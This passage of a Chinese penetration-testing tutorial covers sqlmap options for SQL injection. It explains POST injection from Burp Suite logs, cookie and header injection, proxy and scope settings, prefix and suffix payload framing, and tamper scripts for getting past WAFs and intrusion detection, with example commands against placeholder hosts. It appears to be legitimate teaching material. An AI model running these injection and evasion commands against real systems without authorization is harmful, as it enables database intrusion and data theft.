</li>
</ul>
</li>
</ul>
<h5 id="Post方法"><a href="#Post方法" class="headerlink" title="Post方法"></a>Post方法</h5><ul>
<li>使用http请求文件（burpsuite）</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201213020622.png" alt="image-20230201213020622"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201213252969.png" alt="image-20230201213252969"></p>
<blockquote>
<p>将抓到的http请求信息复制到post.txt文本文件中</p>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201213540956.png" alt="image-20230201213540956"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201215219439.png" alt="image-20230201215219439"></p>
<ul>
<li>使用burpsuite log文件</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201215338405.png" alt="image-20230201215338405"></p>
<blockquote>
<p>选择代理请求并选择log.txt文件保存的位置；之后凡是通过代理访问的所有的http请求都会被log到log.txt文件中</p>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201215705212.png" alt="image-20230201215705212"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201215716573.png" alt="image-20230201215716573"></p>
<blockquote>
<p>通过代理在登录页面访问过的请求都被记录到了log.txt文件中，接着使用sqlmap使用日志文件检测</p>
</blockquote>
<ul>
<li>使用burpsuite log文件</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201215922755.png" alt="image-20230201215922755"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201215935517.png" alt="image-20230201215935517"></p>
<blockquote>
<p>这就是post方法两种sqlmap注入方式</p>
</blockquote>
<ul>
<li><p>HTTPS</p>
<ul>
<li><code>sqlmap -u “https://1.1.1.1/a.php?id=1:8843” --force-ssl</code></li>
</ul>
</li>
<li><p>扫描配置文件</p>
<ul>
<li><code>sqlmap -c sqlmap.conf</code></li>
</ul>
<blockquote>
<p>sqlmap各种配置参数都可以被保存为sqlmap.conf文件，可以使用<code>-c</code>参数调用这个配置文件；其中有一个内置的默认sqlmap.conf文件</p>
</blockquote>
</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201220506462.png" alt="image-20230201220506462"></p>
<h4 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h4><blockquote>
<ul>
<li><p>–data    # 数据段</p>
<ul>
<li>get &#x2F; post 都适用</li>
<li>sqlmap -u “<a target="_blank" rel="noopener" href="http://1.1.1.1/a.php">http://1.1.1.1/a.php</a>“ –data&#x3D;”user&#x3D;1&amp;pass&#x3D;2” -f</li>
<li>将参数提交部分赋值给<code>data</code>参数</li>
</ul>
</li>
<li><p>–param-del      # 变量分隔符</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://1.1.1.1/a.php?q=foo;id=1">http://1.1.1.1/a.php?q=foo;id=1</a> &#x2F;&#x2F; ; &amp;</li>
<li>sqlmap -u “<a target="_blank" rel="noopener" href="http://1.1.1.1/a.php">http://1.1.1.1/a.php</a>“ –data&#x3D;”q&#x3D;foo;id&#x3D;1” –param-del&#x3D;”;” -f</li>
</ul>
</li>
<li><p>–cookie             # cookie头</p>
<ul>
<li>web应用需要基于cookie的身份认证</li>
<li>检查cookie中的注入点<strong>（level&gt;&#x3D;2）</strong></li>
<li>Set-Cookie &#x2F; –drop-set-cookie &#x2F; –cookie-del</li>
<li>sqlmap -u “<a target="_blank" rel="noopener" href="http://1.1.1.1/a.php?id=1">http://1.1.1.1/a.php?id=1</a>“ –cookie&#x3D;”a&#x3D;1;b&#x3D;2” -f</li>
</ul>
</li>
<li><p>–user-agent   <strong>（level &gt;&#x3D; 3）</strong></p>
<ul>
<li>sqlmap&#x2F;1.0-dev-xxxxxxx (<a target="_blank" rel="noopener" href="http://sqlmap.org/">http://sqlmap.org</a>)</li>
</ul>
</li>
<li><p>–random-agent </p>
<ul>
<li>&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;txt&#x2F;user-agents.txt</li>
</ul>
</li>
<li><p>–host    # Host头</p>
<ul>
<li><strong>level&#x3D;5</strong></li>
</ul>
</li>
<li><p>–referer</p>
<ul>
<li><strong>level&#x3D;3</strong></li>
</ul>
</li>
<li><p>–headers      # 额外的header</p>
<ul>
<li>每个头单独一行（名称区分大小写）</li>
</ul>
</li>
<li><p>–method&#x3D;GET&#x2F;POST</p>
</li>
<li><p>基于HTTP协议的身份认证</p>
<ul>
<li><p>Basic</p>
</li>
<li><p>Digest</p>
</li>
<li><p>NTLM</p>
</li>
<li><p><strong>sqlmap. -u “<a target="_blank" rel="noopener" href="http://1.1.1.1/a.php?id=1">http://1.1.1.1/a.php?id=1</a>“ –auth-type Basic –auth-cred</strong> </p>
<p><strong>“user:pass“</strong>        # 命令使用方法</p>
</li>
</ul>
</li>
<li><p>–auth-cert &#x2F; –auth-file</p>
<ul>
<li>–auth-file&#x3D;”ca.PEM”</li>
<li>含有私钥的PEM格式证书文件</li>
<li>PEM格式的证书链文件</li>
</ul>
</li>
<li><p>http(s) 代理</p>
<ul>
<li>–proxy&#x3D;”<a target="_blank" rel="noopener" href="http://127.0.0.1:8087/">http://127.0.0.1:8087</a>“</li>
<li>–proxy-cred&#x3D;”name:pass”</li>
<li>–ignore-proxy<ul>
<li>忽略系统级代理设置，通常用于扫描本地网络目标</li>
</ul>
</li>
<li><code>sqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot; --proxy=&quot;http://127.0.0.1:8087&quot; -f</code></li>
</ul>
</li>
<li><p>–scope</p>
<ul>
<li>过滤日志内容，通过正则表达式筛选扫描对象</li>
<li><code>sqlmap -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)“</code> # 使用<code>\</code>进行转义</li>
<li><code>sqlmap -l 2.log --scope=&quot;(19)?\.168\.20\.(1|10|100)&quot; --level 3 --dbs</code></li>
<li>User-Agent中的注入点   # level&gt;&#x3D;3才会扫描UA头</li>
</ul>
</li>
<li><p>–safe-url &#x2F; –safe-freq</p>
<ul>
<li>检测和盲注截断产生大量失败请求，服务器端可能因此销毁session</li>
<li>每发送–safe-freq次注入请求后，发送一次正常请求</li>
<li>进行错误计数的绕过，连续多次的错误后发送正常请求</li>
</ul>
</li>
<li><p>–skip-urlencode</p>
<ul>
<li>默认Get方法会对传输内容进行编码，某些WEB服务器不遵守RFC标准编码，使用原始字符提交数据</li>
<li>直接添加命令行中，不会对Get请求中提交的数据进行URL编码，使用原始数据提交</li>
</ul>
</li>
<li><p>–evel</p>
<ul>
<li><p>每次请求前执行指定的python代码</p>
</li>
<li><p>每次请求更改或增加新的参数值（时间依赖、其他参数值依赖）</p>
</li>
<li><p><code>sqlmap -u &quot;http://1.1.1.1/a.php?</code></p>
<p><code>id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import</code> </p>
<p><code>hashlib;hash=hashlib.md5(id).hexdigest()&quot;</code> # hash值依赖于id值，其中hashlib.md5()函数将id值进行hash计算后再通过–eval参数赋值自动注入</p>
</li>
</ul>
</li>
<li><p>–delay</p>
<ul>
<li>每次http(s)请求之间延迟时间，浮点数，单位为秒，默认无延迟</li>
<li>防止入侵检测</li>
</ul>
</li>
<li><p>–timeout</p>
<ul>
<li>请求超时时间，浮点数，默认为30s</li>
</ul>
</li>
<li><p>–retries</p>
<ul>
<li>http(s)连接超时重试次数，默认3s</li>
</ul>
</li>
<li><p>–randomize</p>
<ul>
<li>长度、类型与原始值保持一致的前提下，指定每次请求随机取值的参数名</li>
<li>sqlmap -u <a target="_blank" rel="noopener" href="http://1.1.1.1/a.php?id=100">http://1.1.1.1/a.php?id=100</a> –randomize&#x3D;”id”   #  id每次随机取值</li>
</ul>
</li>
</ul>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202095933977.png" alt="image-20230202095933977"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202095953959.png" alt="image-20230202095953959"></p>
<h5 id="–data"><a href="#–data" class="headerlink" title="–data"></a>–data</h5><ul>
<li>Post<ul>
<li>抓包获取<code>url</code>以及数据段</li>
</ul>
</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202211925666.png" alt="image-20230202211925666"></p>
<ul>
<li>使用sqlmap注入</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202212130229.png" alt="image-20230202212130229"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202212212807.png" alt="image-20230202212212807"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202212238431.png" alt="image-20230202212238431"></p>
<ul>
<li><p>Get</p>
<ul>
<li><p>获取url</p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202212555142.png" alt="image-20230202212555142"></p>
</li>
<li><p>注入</p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202213450294.png" alt="image-20230202213450294"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202213339820.png" alt="image-20230202213339820"></p>
</li>
</ul>
</li>
</ul>
<h5 id="–param-del"><a href="#–param-del" class="headerlink" title="–param-del"></a>–param-del</h5><ul>
<li><p>当变量之间的分隔符不是使用<code>&amp;</code>，需要使用分隔符参数</p>
<ul>
<li><p><code>sqlmap -u &quot;http://1.1.1.1/a.php&quot; --data=&quot;q=foo;id=1&quot; --param-del=&quot;;&quot; -f</code></p>
<blockquote>
<p>–param-del会检查每一个变量的分隔符，将<code>&amp;</code>替换为<code>;</code>或者其他分隔符</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h5 id="–cookie"><a href="#–cookie" class="headerlink" title="–cookie"></a>–cookie</h5><ul>
<li>获取cookie</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202214710091.png" alt="image-20230202214710091"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202214748094.png" alt="image-20230202214748094"></p>
<ul>
<li>身份认证方式注入</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202214930072.png" alt="image-20230202214930072"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202215008866.png" alt="image-20230202215008866"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202215028642.png" alt="image-20230202215028642"></p>
<blockquote>
<p>只要拿到一个合法的cookie值，就可以以身份认证用户的身份交给<code>sqlmap</code>执行后续的命令</p>
</blockquote>
<h5 id="–random-agent-amp-–user-agent"><a href="#–random-agent-amp-–user-agent" class="headerlink" title="–random-agent&amp;–user-agent"></a>–random-agent&amp;–user-agent</h5><ul>
<li>使用<code>--random-agent</code></li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202220807471.png" alt="image-20230202220807471"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202220753413.png" alt="image-20230202220753413"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202220724010.png" alt="image-20230202220724010"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202220706873.png" alt="image-20230202220706873"></p>
<ul>
<li>手动指定UA头</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202220952578.png" alt="image-20230202220952578"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202221003958.png" alt="image-20230202221003958"></p>
<h5 id="–host"><a href="#–host" class="headerlink" title="–host"></a>–host</h5><ul>
<li>修改host头</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202221458792.png" alt="image-20230202221458792"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202221447985.png" alt="image-20230202221447985"></p>
<ul>
<li>检查host头注入（level&#x3D;5）</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202221626393.png" alt="image-20230202221626393"></p>
<h5 id="–referer"><a href="#–referer" class="headerlink" title="–referer"></a>–referer</h5><ul>
<li>修改referer头</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202222050044.png" alt="image-20230202222050044"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202222039351.png" alt="image-20230202222039351"></p>
<h5 id="–headers"><a href="#–headers" class="headerlink" title="–headers"></a>–headers</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202222756425.png" alt="image-20230202222756425"></p>
<blockquote>
<p>–headers&#x3D;”Host:<a target="_blank" rel="noopener" href="http://www.abc.com**/n**User-Agent:bbbbbbbbbbb%22%E5%85%B6%E4%B8%AD%60/n%60%E8%A1%A8%E7%A4%BA%E6%8D%A2%E8%A1%8C%EF%BC%8C%E7%94%B1%E4%BA%8E%60--headers%60%E5%8F%82%E6%95%B0%E9%9C%80%E8%A6%81%E6%8C%87%E5%AE%9A%E6%AF%8F%E8%A1%8C%E4%B8%80%E4%B8%AA%EF%BC%8C%E6%89%80%E4%BB%A5%E9%9C%80%E8%A6%81%E6%B7%BB%E5%8A%A0%E5%A4%9A%E4%B8%AAheader%E7%9A%84%E8%AF%9D%E7%94%A8%60/n%60%E6%9D%A5%E6%8D%A2%E8%A1%8C">www.abc.com**\n**User-Agent:bbbbbbbbbbb&quot;其中`\n`表示换行，由于`--headers`参数需要指定每行一个，所以需要添加多个header的话用`\n`来换行</a></p>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202222820615.png" alt="image-20230202222820615"></p>
<h5 id="–method-x3D-GET-x2F-POST"><a href="#–method-x3D-GET-x2F-POST" class="headerlink" title="–method&#x3D;GET&#x2F;POST"></a>–method&#x3D;GET&#x2F;POST</h5><ul>
<li>指定请求方法</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202223032127.png" alt="image-20230202223032127"></p>
<h5 id="–scope"><a href="#–scope" class="headerlink" title="–scope"></a>–scope</h5><ul>
<li>设置日志文件<strong>（图中应该是burp.log日志文件，不是burp.txt）</strong></li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202102245148.png" alt="image-20230202102245148"></p>
<ul>
<li><p>产生访问请求</p>
<blockquote>
<p>此时burp.txt文件中产生了大量的数据</p>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202102636652.png" alt="image-20230202102636652"></p>
</li>
<li><p>使用sqlmap</p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202104848801.png" alt="image-20230202104848801"></p>
<blockquote>
<p>–level&#x3D;3表示扫描UA头</p>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202105028509.png" alt="image-20230202105028509"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202110609330.png" alt="image-20230202110609330"></p>
</li>
</ul>
<h4 id="Optimization"><a href="#Optimization" class="headerlink" title="Optimization"></a>Optimization</h4><blockquote>
<ul>
<li>优化性能</li>
<li>-o：开启前三个性能参数（除–threads参数）</li>
<li>–predict-output  # 预设的输出<ul>
<li>根据检测方法，比对返回值和<strong>统计表</strong>内容，不断缩小检测内容，提高检测效率</li>
<li>在统计表中比对：版本名、用户名、密码、Privileges、role、数据库名称、表名、列名</li>
<li>与–threads（线程）参数不兼容</li>
<li><strong>统计表</strong>：&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;txt&#x2F;common-outputs.txt</li>
</ul>
</li>
<li>–keep-alive<ul>
<li>使用http(s)长连接，性能好</li>
<li>与–proxy参数不兼容</li>
<li>长连接避免重复建立连接的网络开销，但大量长连接会严重占用服务器资源</li>
</ul>
</li>
<li>–null-connection<ul>
<li>只获取相应页面的大小值，而非页面具体内容</li>
<li>通常用于盲注判断 真 &#x2F; 假，降低网络带宽消耗</li>
<li>与–text-only参数不兼容（基于页面内容的比较判断 真 &#x2F; 假）</li>
</ul>
</li>
<li>–threads<ul>
<li>最大并发线程</li>
<li>盲注时每个线程获取一个字符（7次请求），获取完成后线程结束</li>
<li>默认值为1，建议不要超过10，否则可能影响站点可用性</li>
<li>与–predict-output参数不兼容</li>
</ul>
</li>
</ul>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202122832188.png" alt="image-20230202122832188"></p>
<h4 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h4><blockquote>
<ul>
<li><p>-p</p>
<ul>
<li>指定扫描参数，使<code>--level</code>失效</li>
<li>-p “user-agent,referer”</li>
</ul>
</li>
<li><p>–skip</p>
<ul>
<li>排除指定的扫描参数</li>
<li>–level&#x3D;5 –skip&#x3D;”id,user-agent”</li>
</ul>
</li>
<li><p>URI注入点</p>
<ul>
<li><code>sqlmap -u &quot;http://targeturl/param1/value1*/param2/value2*/&quot;</code></li>
</ul>
</li>
<li><p>–dbms</p>
<ul>
<li>指定数据库以及对应的版本号进行扫描探测</li>
<li>MySQL &lt;5.0&gt;、Oracle &lt;11i&gt;、Microsoft SQL Server &lt;2005&gt;、PostgreSQL、Microsoft Access、SQLite、Firebird、Sybase、SAP MaxDB、DB2</li>
</ul>
</li>
<li><p>–os</p>
<ul>
<li><p>指定目标操作系统</p>
</li>
<li><p>Linux、Windows</p>
</li>
</ul>
</li>
<li><p>–invalid-bignum &#x2F; –invalid-logical</p>
<ul>
<li>通常sqlmap使用负值使参数取值失效 id&#x3D;13—&gt;id&#x3D;-13</li>
<li>bignum使用大数使参数值失效 id&#x3D; 99999999</li>
<li>logical使用布尔判断使取值失效 id&#x3D;13 AND 18&#x3D;19</li>
</ul>
</li>
<li><p>–no-cast</p>
<ul>
<li>榨取数据时，sqlmap将所有结果转换为字符串，并用空格替换NULL结果</li>
<li>老版本mysql数据库需要开启此开关进行注入</li>
</ul>
</li>
<li><p>–no-escape   # 不逃逸</p>
<ul>
<li>出于混淆和避免出错的目的，payload中用单引号界定字符串时，sqlmap使用char()编码逃逸的方法替换字符串</li>
<li>SELECT ‘foo’  —&gt;  SELECT CHAR(102)+CHAR(111)+CHAR(111)</li>
<li>本参数将关闭此功能</li>
</ul>
</li>
<li><p>–prefix &#x2F; –suffix   # 前缀 &#x2F; 后缀</p>
</li>
<li><p>例：<code>$query = &quot;SELECT * FROM users WHERE id=(&#39;&quot; . $_GET[&#39;id&#39;] . &quot;&#39;) LIMIT 0, 1&quot;;</code></p>
</li>
<li><p>注入命令：<code>sqlmap -u &quot;http://1.1.1.1/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&#39;)&quot; --suffix &quot;AND (&#39;abc&#39;=&#39;abc&quot;</code></p>
</li>
<li><p>最终形成的注入语句：<code>query = &quot;SELECT * FROM users WHERE id=(&#39;1&#39;) &lt;PAYLOAD&gt; AND (&#39;abc&#39;=&#39;abc&#39;) LIMIT 0, 1&quot;;</code></p>
</li>
<li><p>–tamper </p>
<ul>
<li>混淆脚本，用于绕过应用层过滤、IPS、WAF</li>
<li><code>sqlmap -u “http://1.1.1.1/a.php?id=1” --tamper=&quot;tamper/between.py,tamper/randomcase.py,tamper/space2comment.py&quot; -v 3</code></li>
</ul>
</li>
</ul>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203113518787.png" alt="image-20230203113518787"></p>
<h5 id="p-指定参数注入"><a href="#p-指定参数注入" class="headerlink" title="-p 指定参数注入"></a>-p 指定参数注入</h5><blockquote>
<p>使用<code>-p</code>参数会使level值失效</p>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203114251356.png" alt="image-20230203114251356"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203114309492.png" alt="image-20230203114309492"></p>
